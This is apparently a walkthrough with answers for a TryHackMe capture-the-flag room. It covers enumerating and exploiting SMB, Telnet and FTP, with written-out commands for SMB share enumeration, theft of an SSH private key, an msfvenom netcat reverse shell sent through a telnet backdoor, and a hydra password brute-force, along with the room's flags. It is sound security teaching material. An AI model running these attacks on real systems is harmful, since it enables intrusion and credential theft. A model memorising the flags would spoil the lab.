Get Connected

Pre-requsite: A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you'll need some help with this, try completing the 'Linux Fundamentals' Module (https://tryhackme.com/module/linux-fundamentals)

Understanding SMB

What is SMB?
SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

What runs SMB?
Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

Question 1:What does SMB stand for?
Ans:Server Message Block

Question 2:What type of protocol is SMB?
Ans:response-request

Question 3:What do clients connect to servers using? 
Ans:TCP/IP

Question 4:What systems does Samba run on?
Ans:Unix

Enumerating SMB

Enumeration:
Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

SMB:
SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information â€” you'd be surprised what is sometimes included on these shares.

Port Scanning:
Find out as much information as you can about the services, applications, structure and operating system of the target machine.

Enum4Linux:
Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB.
It's already installed on the AttackBox, however if you need to install it on your own attacking machine, you can do so from the official github:https://github.com/CiscoCXSecurity/enum4linux.

Syntax:"enum4linux [options] ip"

few options which can help are:
TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             all of the above (full basic enumeration)

Question 5:Conduct an nmap scan of your choosing, How many ports are open?
Ans:3

Question 6:What ports is SMB running on?
Ans:139/445

Question 7:Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
Ans:WORKGROUP

Question 8:What comes up as the name of the machine?        
Ans:POLOSMB

Question 9:What operating system version is running?
Ans:6.1

Question 10:What share sticks out as something we might want to investigate?  
Ans:profiles

Exploiting SMB

Types of SMB Exploit

exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.
In many case vulnerabilities such as CVE-2017-7494, can allow remote code execution by exploiting SMB.

Method Breakdown

from our enumeration stage, we know:
    - The SMB share location
    - The name of an interesting SMB share
The above details are both related to profiles which we can across in Share information of enum4linux enumeration.

SMBClient
Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. 

syntax: "smbclient //[IP]/[SHARE]"

Question 11: What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
Ans: smbclient //10.10.10.2/secret -U suit -p 445

Question 12: Does the share allow anonymous access? Y/N?
Ans: Y

Question 13:Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
Ans: John Cactus

Question 14: What service has been configured to allow him to work from home?
Ans: ssh

Question 15: Okay! Now we know this, what directory on the share should we look in?
Ans: .ssh

Question 16: This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
Ans: id_rsa

Question 17: What is the smb.txt flag?
Ans: THM{smb_is_fun_eh?}

Understanding Telnet

What is Telnet?
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

Replacement: As telent uses no encryption or masking while sending the data most of the implemetions are replaced with ssh.

How does Telnet work?
The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt.
Syntax: "telnet [ip] [port]"

Question 18: What is Telnet?
Ans: application protocol

Question 19: What has slowly replaced Telnet?    
Ans: ssh

Question 20: How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
Ans: telnet 10.10.10.3 23

Question 21: The lack of what, means that all Telnet communication is in plaintext?
Ans: encryption

Enumerating Telnet

NOTE: when it comes to enumerating network services, we need to be thorough in our method.
Port Scanning
find out as much information as we can about the services, applications, structure and operating system of the target machine. 


Question 22:How many ports are open on the target machine?    
Ans:1

Question 23:What port is this?
Ans:8012

Question 24:This port is unassigned, but still lists the protocol it's using, what protocol is this?
Ans:tcp

Question 25:Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
Ans:0

NOTE: Here, we see that by assigning telnet to a non-standard port, it is not part of the common ports list, or top 1000 ports, that nmap scans. 
It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.
Question 26:Based on the title returned to us, what do we think this port could be used for?
Ans: a backdoor

Question 27: Who could it belong to? Gathering possible usernames is an important step in enumeration.
Ans: Skidy

NOTE: Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

Exploiting Telnet

There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
https://www.cvedetails.com/
https://cve.mitre.org/

Method Breakdown
So, from our enumeration stage, we know:
    - There is a poorly hidden telnet service running on this machine
    - The service itself is marked "backdoor"
    - We have possible username of "Skidy" implicated
Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

What is a Reverse Shell?

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

Question 28: Great! It's an open telnet connection! What welcome message do we receive?
Ans: SKIDY'S BACKDOOR.

Question 29: Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
Ans: N

Note: Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

Start a tcpdump listener on your local machine.
If using your own machine with the OpenVPN connection, use:
sudo tcpdump ip proto \\icmp -i tun0
If using the AttackBox, use:
sudo tcpdump ip proto \\icmp -i ens5

Note: This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

Question 30: Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
Ans: Y
Note: Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

Question 31: What word does the generated payload start with?
Ans: mkfifo

Question 32: Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
"nc -lvnp [listening port]"
What would the command look like for the listening port we selected in our payload?
Ans: nc -lvnp 4444

Note: Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

Question 33: Success! What is the contents of flag.txt?
Ans: THM{y0u_g0t_th3_t3ln3t_fl4g}

Understanding FTP

What is FTP?
Protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

How does FTP work?
A typical FTP session operates using two channels:
- A command (sometimes called the control) channel: command channel is used for transmitting commands as well as replies to those commands
- A data channel: data channel is used for transferring data.

Active vs Passive

The FTP server may support either Active or Passive connections, or both. 
In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

More Details:https://www.ietf.org/rfc/rfc959.txt

Question 34: What communications model does FTP use?
Ans: client-server

Question 35: What's the standard FTP port?
Ans: 21

Question 36: How many modes of FTP connection are there?   
Ans: 2

Enumerating FTP

Method
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

Alternative Enumeration Methods
It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that donâ€™t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.

documented at: https://www.exploit-db.com/exploits/20745 

Question 37: How many ports are open on the target machine? 
Ans: 2
Note the scan gives only one port as open but the answer is 2 so dig around to find why?

Question 38: What port is ftp running on?
Ans: 21

Question 39: What variant of FTP is running on it?  
Ans: vsftpd

Question 40: What is the name of the file in the anonymous FTP directory?
Ans: PUBLIC_NOTICE.txt

Question 41: What do we think a possible username could be?
Ans: mike

Note: Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

Exploiting FTP

Types of FTP Exploit
Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

Method Breakdown
    - There is an FTP server running on this machine
    - We have a possible username
Using this information, let's try and bruteforce the password of the FTP Server.

Hydra
Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.

Syntax for the command we're going to use to find the passwords is this:
"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"

SECTION             FUNCTION
hydra                   Runs the hydra tool
-t 4                    Number of parallel connections per target
-l [user]               Points to the user who's account you're trying to compromise
-P [path to dictionary] Points to the file containing the list of possible passwords
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]            The IP address of the target machine
ftp / protocol          Sets the protocol


Question 42: What is the password for the user "mike"?
Ans: password

Note: Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted
Question 43: What is ftp.txt?
Ans: THM{y0u_g0t_th3_ftp_fl4g}

Expanding Your Knowledge

Reading

Here's some things that might be useful to read after completing this room, if it interests you:
https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
https://attack.mitre.org/techniques/T1210/
https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/



